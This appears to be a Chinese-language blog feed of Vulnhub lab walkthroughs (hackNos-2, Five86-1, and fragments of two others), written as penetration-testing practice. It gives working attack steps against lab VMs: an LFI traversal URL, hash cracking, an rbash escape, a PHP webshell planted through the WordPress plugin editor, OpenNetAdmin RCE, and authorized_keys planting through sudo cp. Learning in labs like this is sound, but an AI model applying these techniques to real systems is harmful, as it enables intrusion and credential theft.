3vilH@ksor</span><br><span class="line"></span><br><span class="line">======================</span><br><span class="line">technawi@Jordaninfosec-CTF01:~$ cat /var/www/html/flag.txt </span><br><span class="line">The 5th flag is : &#123;5473215946785213456975249&#125;</span><br><span class="line"></span><br><span class="line">Good job :)</span><br><span class="line"></span><br><span class="line">You find 5 flags and got their points and finish the first scenario....</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>hackNos-2</title>
    <url>/2020/03/09/hackNos-2/</url>
    <content><![CDATA[<blockquote>
<p>2020-02-11-14——2020-02-12-13</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Difficulty : Easy <span class="keyword">to</span> Intermediate</span><br><span class="line"></span><br><span class="line">Flag : 2 Flag first<span class="built_in"> user </span><span class="keyword">And</span> second root</span><br><span class="line"></span><br><span class="line">Learning : Web Application | Enumeration | Password Cracking</span><br><span class="line"></span><br><span class="line"><span class="comment">## Changelog - 2019-12-13 ~ v1.1 - 2019-11-29 ~ v1.0</span></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">Kali：<span class="number">192.168</span><span class="number">.56</span><span class="number">.109</span></span><br><span class="line"></span><br><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>

<p>主机存活扫描：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>

<br>

<p>找到目标地址后，扫面服务及操作系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.113</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br></pre></td></tr></table></figure>

<br>

<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问 80 端口，略过 Apache 的干扰视线页面，直接扫目录：</p>
<br>

<p><img src="2020-02-11-14-04-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-11-14-08-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>


<p>目录访问如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.113/index.html		<span class="comment"># Apache 页面，无有价值信息</span></span><br><span class="line"></span><br><span class="line">http://192.168.56.113/tsweb				<span class="comment"># 主要目录，WordPress 5.3</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>WordPress</code> 扫描：</p>
<ul>
<li><code>Cmseek</code> ：简单扫描</li>
<li><code>wpscan</code> ：详细扫描</li>
</ul>
<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmseek.py -u http://192.168.56.113/tsweb</span><br><span class="line"></span><br><span class="line">wpscan --url http://192.168.56.113/tsweb/</span><br></pre></td></tr></table></figure>

<br>

<p><code>WP</code> 一般就是插件方面的漏洞比较多，<code>searchsploit</code> 也多是插件与主题的漏洞，扫得：</p>
<ul>
<li>插件：<code>gracemedia-media-player</code> <code>version 1.0</code> </li>
<li>用户名：<code>user</code>  </li>
</ul>
<br>

<p><img src="2020-02-11-14-55-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-11-17-09-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>试着爆破一下后台 <code>wp-admin</code> ，需要收集一些社工资料，在<code>tsweb</code> 主页有个 <code>about</code> </p>
<p>得到靶机作者姓名，然后生成字典，Burp 跑爆破，无果……</p>
<br>

<p><img src="2020-02-11-15-42-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-11-16-47-28%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>


<p>回到上一步，搜索 <code>gracemedia-media-player</code> 插件，有个 <strong>LFI</strong> 漏洞，利用成功，得到一个用户：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.113</span><span class="regexp">/tsweb/</span>wp-content<span class="regexp">/plugins/g</span>racemedia-media-player<span class="regexp">/templates/</span>files<span class="regexp">/ajax_controller.php?ajaxAction=getIds&amp;cfg=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>

<br>

<p><a href="https://cxsecurity.com/issue/WLB-2019030113" target="_blank" rel="noopener"><strong>WordPress GraceMedia Media Player 1.0 Local File Inclusion</strong></a> </p>
<br>

<p><img src="2020-02-11-17-13-12%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="symbol">flag:</span>$1$flag$vqjCxzjtRc7PofLYS2lWf/<span class="symbol">:</span><span class="number">1001</span><span class="symbol">:</span><span class="number">1003</span><span class="symbol">:</span><span class="symbol">:/home/flag</span><span class="symbol">:/bin/rbash</span></span><br></pre></td></tr></table></figure>

<br>

<p><code>/etc/passwd</code> 的格式中，第一栏是 <strong>用户名</strong> ，第二栏是 <strong>密码</strong> ，破解 Hash，各大破解网站都试了一遍，除了 <code>cmd5.com</code> 有记录外（付费），其他要么不识别，要么无此条目</p>
<br>

<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><p>搜了一下 <code>Write-up</code> ，使用 <code>Jhon</code> 破解。得到密码（<code>topsecret</code>）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long 1.hash</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-11-18-06-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
<br>

<p>登录 SSH 成功，<code>shell</code> 为 <code>rbash</code> ，一个受限制的 <code>shell</code> ，使用 <code>Vim</code> 绕过：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim</span><br><span class="line"></span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-11-18-38-21%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><br>

<p>查看 <code>sudo -l</code> 可以干什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="comment"># Sorry, user flag may not run sudo on hacknos.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SUID 无有价值程序</span></span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br></pre></td></tr></table></figure>

<br>
<br>


<p>想到之前在 <code>/etc/passwd</code> 看到还有一个 <code>rohit</code> 用户，<code>HOME</code> 目录有访问权，无查看权，需要提权</p>
<p>搜一波相关内容文件，得到 <code>rohit</code> 的密码哈希，丢后台破解：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'rohit'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-12-11-49-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>
<br>


<p>继续收集信息，有 WordPress 肯定就有配置文件和 MySQL，进入网站根目录下：</p>
<p><code>ls -al</code> 显示着唯一同时具备 <code>rw</code> 权限的文件，有猫腻，得到数据库名及一组用户名密码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DA_NAME：</span></span><br><span class="line">wordpress</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_USER：</span></span><br><span class="line">wpuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># DB_PASSWORD：</span></span><br><span class="line">hackNos-2.com</span><br></pre></td></tr></table></figure>

<br>
<br>


<p><img src="2020-02-11-18-44-41%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
<br>

<p>登录数据库：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mysql -h localhost -u wpuser -p hackNos-2.com</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM wp_users;</span><br></pre></td></tr></table></figure>

<br>

<p>又得到一组用户名与密码（被加密），有密码需要破解，又没钱，只能看 <code>Write-up</code> ，可以改密码：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">user:$P$B.<span class="meta">O0</span>cLM<span class="symbol">Nmn7</span>EoX.JMHP<span class="symbol">nNIPuBYw6</span>S<span class="number">2</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 改密码为 user</span><br><span class="line">update wp_users set user_pass=md5(&quot;user&quot;) where user_login=&apos;user&apos;;</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<p>目前账号信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 低权限用户（rbash），已经无价值了</span></span><br><span class="line">flag：topsecret</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mysql 登录</span></span><br><span class="line">wpuser：hackNos-2.com</span><br><span class="line"><span class="comment"># 无法 SSH/Web 后台</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># WordPress 用户，可登录 Web后台</span></span><br><span class="line">user：<span class="variable">$P</span><span class="variable">$B</span>.O0cLMNmn7EoX.JMHPnNIPuBYw6S2 改为：user</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rohit：<span class="variable">$1</span><span class="variable">$rohit</span><span class="variable">$01Dl0NQKtgfeL08fGrggi0</span></span><br></pre></td></tr></table></figure>

<br>

<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><br>

<p>后台密码破解中。先去 WordPress 后台看看</p>
<br>

<p>登录 WordPress 后台，试着能不能上传文件，反弹个 <code>shell</code> ，添加的新文章内添加代码被直接显示出来，不被渲染，还有个 <strong>插件编辑</strong> 的，写入 PHP 木马，监听端口，访问木马页面，反弹成功，<code>www-data</code> 用户：</p>
<br>

<p><img src="2020-02-11-19-29-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-11-19-29-17%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取一个交互式 shell</span></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

<p>一波查看，这个用户似乎也干不了什么大事，权限也不够</p>
<br>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>rohit</code> 的密码没跑出来， <code>cmd5.com</code> 收费，若是真实渗透的话，充值一下也无所谓</p>
<p>这里直接看的 <code>Write-up</code> ，密码明文：<code>!%hack41</code> </p>
<br>

<p>SSH 登录 <code>rohit</code> ，看看可以干什么……ALL。查看 <code>HOME</code> 目录，得到一个 FLAG 和 一个 MD5 Hash：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">User rohit may run the following commands on hacknos:</span><br><span class="line">    (ALL : ALL) ALL</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-12-12-29-29%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>
<br>

<p>查看是否还有其他有价值的信息：<code>ls -al</code> ， (o゜▽゜)o☆[BINGO!]</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.sudo_as_admin_successful</span><br></pre></td></tr></table></figure>

<p>这个可使用 <code>rohit</code> 的密码切换成为 <code>root</code> 用户，得到 <code>root.txt</code> </p>
<br>
<br>

<p><img src="2020-02-12-12-31-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-12-12-34-44%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<hr>
<br>

<p>这里似乎登录 <code>WordPress</code> 后台没什么作用，只是扩大了信息，或许以后会发现他的用处</p>
<br>

<p>这里难的地方就是 Hash 破解了吧，没台好机器，没个好字典，没个好在线工具</p>
<br>

<hr>
<br>

<p>看了一下别人的 <code>Write-up</code> 发现自己忽略了一个提权方式（这就是缺乏经验吧……）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br></pre></td></tr></table></figure>

<br>

<p>搜索 <code>SUID</code> 的时候，出现的 <code>sudo</code> 和 <code>passwd</code> 可以配合修改 <code>root</code> 的密码</p>
<p>因为 <code>flag</code> 用户不在 <code>sudoers</code> 中，无法提权，但是 <code>rohit</code> 在。</p>
<br>

<p>这里就是为了记一下， <code>sudo</code> 和 <code>passwd</code> 同时有 <code>SUID</code> 权限，且用户位于 <code>/etc/sudoers</code> 中的时候，可以修改 <code>root</code> 密码</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Five86-1</title>
    <url>/2020/03/10/Five86-1/</url>
    <content><![CDATA[<blockquote>
<p><code>2020-02-14 14</code> —— <code>2020-02-14 16</code> </p>
</blockquote>
<br>

<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">Description</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> another purposely built vulnerable lab <span class="keyword">with</span> <span class="keyword">the</span> intent <span class="keyword">of</span> gaining experience <span class="keyword">in</span> <span class="keyword">the</span> world <span class="keyword">of</span> penetration testing.</span><br><span class="line"></span><br><span class="line">The ultimate goal <span class="keyword">of</span> this challenge <span class="keyword">is</span> <span class="keyword">to</span> <span class="keyword">get</span> root <span class="keyword">and</span> <span class="keyword">to</span> <span class="built_in">read</span> <span class="keyword">the</span> one <span class="keyword">and</span> only flag.</span><br><span class="line"></span><br><span class="line">Linux skills <span class="keyword">and</span> familiarity <span class="keyword">with</span> <span class="keyword">the</span> Linux command line are a must, <span class="keyword">as</span> <span class="keyword">is</span> <span class="keyword">some</span> experience <span class="keyword">with</span> basic penetration testing tools.</span><br><span class="line"></span><br><span class="line">For beginners, Google can be <span class="keyword">of</span> great assistance, <span class="keyword">but</span> you can always tweet <span class="keyword">me</span> <span class="keyword">at</span> @DCAU7 <span class="keyword">for</span> assistance <span class="keyword">to</span> <span class="keyword">get</span> you going again. But take note: I won't give you <span class="keyword">the</span> answer, instead, I'll give you an idea <span class="keyword">about</span> how <span class="keyword">to</span> move forward.</span><br><span class="line"></span><br><span class="line">Technical Information</span><br><span class="line">Five86<span class="number">-1</span> <span class="keyword">is</span> a VirtualBox VM built <span class="keyword">on</span> Debian <span class="number">64</span> bit, <span class="keyword">but</span> there shouldn't be any issues <span class="built_in">running</span> <span class="keyword">it</span> <span class="keyword">on</span> most PCs.</span><br><span class="line"></span><br><span class="line">Five86<span class="number">-1</span> has been tested successfully <span class="keyword">on</span> VMWare Player, <span class="keyword">but</span> <span class="keyword">if</span> there are any issues <span class="built_in">running</span> this VM <span class="keyword">in</span> VMware, have a <span class="built_in">read</span> <span class="keyword">through</span> <span class="keyword">of</span> this.</span><br><span class="line"></span><br><span class="line">It <span class="keyword">is</span> currently configured <span class="keyword">for</span> Bridged Networking, however, this can be changed <span class="keyword">to</span> suit your requirements. Networking <span class="keyword">is</span> configured <span class="keyword">for</span> DHCP.</span><br><span class="line"></span><br><span class="line">Installation <span class="keyword">is</span> simple - download <span class="keyword">it</span>, unzip <span class="keyword">it</span>, <span class="keyword">and</span> <span class="keyword">then</span> import <span class="keyword">it</span> <span class="keyword">into</span> VirtualBox <span class="keyword">or</span> VMWare <span class="keyword">and</span> away you go.</span><br><span class="line"></span><br><span class="line">Important</span><br><span class="line">While there should be no problems using this VM, <span class="keyword">by</span> downloading <span class="keyword">it</span>, you accept full responsibility <span class="keyword">for</span> any unintentional damage <span class="keyword">that</span> this VM may cause.</span><br><span class="line"></span><br><span class="line">In saying <span class="keyword">that</span>, there shouldn't be any problems, <span class="keyword">but</span> I feel <span class="keyword">the</span> need <span class="keyword">to</span> throw this out there just <span class="keyword">in</span> case.</span><br><span class="line"></span><br><span class="line">Credits</span><br><span class="line">A big thanks goes out <span class="keyword">to</span> <span class="keyword">the</span> members <span class="keyword">of</span> @m0tl3ycr3w.</span><br><span class="line"></span><br><span class="line">Contact</span><br><span class="line">I'm also very interested <span class="keyword">in</span> hearing how people go <span class="keyword">about</span> solving these challenges, so <span class="keyword">if</span> you're up <span class="keyword">for</span> writing a walkthrough, please do so <span class="keyword">and</span> send <span class="keyword">me</span> a link, <span class="keyword">or</span> alternatively, follow <span class="keyword">me</span> <span class="keyword">on</span> Twitter, <span class="keyword">and</span> DM <span class="keyword">me</span> (you can unfollow <span class="keyword">after</span> you've DM'd <span class="keyword">me</span> <span class="keyword">if</span> you'd prefer).</span><br><span class="line"></span><br><span class="line">I can be contacted via Twitter - @Five86_x</span><br></pre></td></tr></table></figure>

<br>
<br>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Kali : 192.168.56.109</span><br><span class="line">目标网段 : 192.168.56.1/24</span><br></pre></td></tr></table></figure>

<br>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>

<p>主机存活：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -s -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>

<p>扫服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.114</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<p>访问 80 端口，无有价值信息</p>
<p>例行扫目录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch.py -u http://192.168.56.114 -e php --random-agents</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-14-14-35-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>经访问：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">########################</span></span><br><span class="line">[14:35:21] 200 -   30B  - /index.html    <span class="comment"># 404</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports          <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 401 -  461B  - /reports/Webalizer/   <span class="comment"># need user|passwd</span></span><br><span class="line">[14:35:25] 200 -   29B  - /robots.txt</span><br><span class="line"><span class="comment">#####</span></span><br><span class="line">http://192.168.56.114/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /ona</span><br><span class="line"><span class="comment">########################</span></span><br><span class="line">http://192.168.56.114/ona	<span class="comment"># OpenNetAdmin</span></span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-14-14-45-09%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>搜索相关漏洞，得到远程命令执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit opennetadmin</span><br></pre></td></tr></table></figure>

<p><img src="2020-02-14-14-44-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<h2 id="海滩登陆"><a href="#海滩登陆" class="headerlink" title="海滩登陆"></a>海滩登陆</h2><br>

<p>使用 <code>47691.sh</code> 如果报错的话，可以先 <code>dos2unix</code> 转换一下格式，作者可能在 <code>dos</code> 环境下写的脚本</p>
<br>

<p><img src="2020-02-14-18-38-51%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>
<br>

<p>使用 MSF：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 先复制到桌面</span></span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/47772.rb ~/Desktop/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到 MSF 内利用</span></span><br><span class="line">cp 47772.rb /usr/share/metasploit-framework/modules/exploits/</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-14-15-10-23%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
<br>

<p>测试发现存在 <code>Python</code> 使用交互式 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt; shell</span><br><span class="line"></span><br><span class="line">python -c <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>

<br>

<p>先看 <code>/etc/passwd</code> 有多少用户及有价值信息。目录全无访问权</p>
<br>

<p><img src="2020-02-14-15-13-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
<p><img src="2020-02-14-15-13-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>这个时就需要最后的搜刮一下，得到了一组用户密码。其他用户，无有价值信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep -ri --color=auto --exclude-dir=proc/ <span class="string">'douglas'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-14-15-28-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
<p><img src="2020-02-14-15-30-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<hr>
<br>

<p>Hash 破解，没跑成来，查了一下，会用到作者给的提示 <code>aefhrt</code>。使用 <code>crunch</code> 生产字典：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ crunch 10 10 aefhrt &gt;word.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">$ crunch 10 10 aefhrt -o word.txt</span><br><span class="line"></span><br><span class="line">$ john --wordlist=word.txt <span class="built_in">hash</span> </span><br><span class="line">$ john --show <span class="built_in">hash</span> </span><br><span class="line"></span><br><span class="line">?:fatherrrrr</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-14-15-51-31%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<h2 id="身份切换-SSH免密登陆"><a href="#身份切换-SSH免密登陆" class="headerlink" title="身份切换(SSH免密登陆)"></a>身份切换(SSH免密登陆)</h2><br>

<p>登录 SSH，得到普通用户，目录下除了 <code>.ssh/</code> 外无其他有价值信息。</p>
<p>可使用的 <code>sudo</code> 命令为 <code>cp</code> ：</p>
<br>

<p><img src="2020-02-14-16-03-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>涉及知识的盲区了，特地去查询记录了一下</p>
<br>

<p><code>cp</code> 命令可以配合  <code>SSH（authorized_keys）</code> 免密登录到其他用户：</p>
<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为目标生成 ssh key</span></span><br><span class="line">ssh-keygen -b 2048</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制生成的 id_rsa.pub 到 /tmp 下并改名为 authorized_kes</span></span><br><span class="line">cp /home/douglas/.ssh/id_rsa.pub /tmp/authorized_kes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改变 authorized_kes 的权限</span></span><br><span class="line">chmod 777 authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制到目标 .ssh/ 下</span></span><br><span class="line">sudo -u jen /bin/cp authorized_keys /home/jen/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登陆</span></span><br><span class="line">ssh jen@127.0.0.1</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><img src="2020-02-14-16-16-13%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-14-16-18-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>说是有邮件，查看邮件，得到另一组用户名和密码，登陆成功。</p>
<br>


<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><br>

<p>看目录，得到一个 <code>SUID</code> 的二进制文件，可以直接成为 <code>root</code> ，进 <code>root</code> 目录，得到 Flag</p>
<br>
<br>

<p><img src="2020-02-14-16-25-30%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-14-16-28-08%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<hr>
<br>

<p>与其说是提权，不如说是作者准备好的外挂道具，让你可以一举成神，有种欲求不满的感觉，前面刚鼓起的劲，到了后面直接一键 <code>root</code> ，无法满足啊</p>
<br>

<p>不过，也是学到技能了</p>
<br>

<p>也可以使用如下方式：</p>
<ul>
<li>创建一个权限 <code>777</code> 的文件</li>
<li>使用 <code>find</code> 命令查找 <code>Jen</code> 创建的文件</li>
<li>使用 <code>cp</code> 命令，复制找到的文件 到 <code>777</code> 权限的 文件</li>
<li><code>cat</code> 查看</li>
</ul>
<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sudo -u</span></span><br><span class="line">-u, --user=user              <span class="comment"># 以指定用户或 ID</span></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jen /bin/cp /var/mail/jen ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
        <tag>OSCP</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶机——Me and My Girlfirend1</title>
    <url>/2020/03/03/Me-and-My-Girlfirend1/</url>
    <content><![CDATA[<blockquote>
<p>2020-02-10-22</p>
</blockquote>
<br>

<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Description: This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, "Ceban Corp", something has changed from Alice's attitude towards Bob like something is "hidden", And Bob asks for your <span class="keyword">help</span> <span class="keyword">to</span> <span class="keyword">get</span> what Alice <span class="keyword">is</span> hiding <span class="keyword">and</span> <span class="keyword">get</span> <span class="keyword">full</span> <span class="keyword">access</span> <span class="keyword">to</span> the company!</span><br><span class="line"></span><br><span class="line">Difficulty <span class="keyword">Level</span>: Beginner</span><br><span class="line"></span><br><span class="line">Notes: there <span class="keyword">are</span> <span class="number">2</span> flag files</span><br><span class="line"></span><br><span class="line">Learning: Web Application | Simple Privilege Escalation</span><br><span class="line"></span><br><span class="line"><span class="keyword">From</span> : https://www.vulnhub.com/entry/me-<span class="keyword">and</span>-my-girlfriend<span class="number">-1</span>,<span class="number">409</span>/</span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">Kali：<span class="number">192.168</span><span class="number">.56</span><span class="number">.109</span></span><br><span class="line"></span><br><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>

<p>显示主机存活扫描：</p>
